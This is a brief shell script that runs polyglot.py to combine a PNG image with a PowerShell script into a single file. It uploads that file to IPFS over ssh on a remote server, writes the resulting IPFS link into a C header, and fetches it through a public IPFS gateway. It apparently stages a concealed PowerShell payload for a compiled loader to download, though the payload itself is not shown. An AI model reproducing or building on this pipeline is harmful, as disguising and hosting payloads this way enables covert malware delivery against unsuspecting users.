set -x

python polyglot.py oreoin.png oreo2.png script.ps1
CID=$(cat oreo2.png | ssh instance2.oracle.servers.malhotra.cc sudo -u ipfs ipfs add --pin=false --cid-version 0 -Q)

echo "#define LINK \"/ipfs/"$CID'"' > ./VAR.h

curl ipfs.io/ipfs/$CID -Ls > /dev/null
